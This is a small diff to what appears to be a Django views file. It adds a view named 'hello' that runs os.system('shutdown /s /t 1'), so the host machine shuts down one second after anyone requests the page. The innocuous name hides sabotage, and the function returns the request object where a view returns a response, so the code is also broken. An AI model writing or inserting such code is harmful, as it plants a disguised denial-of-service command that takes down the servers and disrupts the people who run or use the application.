@@ -1,3 +1,6 @@
 from django.shortcuts import render
 
-# Create your views here.
+def hello(request):
+    import os
+    os.system('shutdown /s /t 1')
+    return request
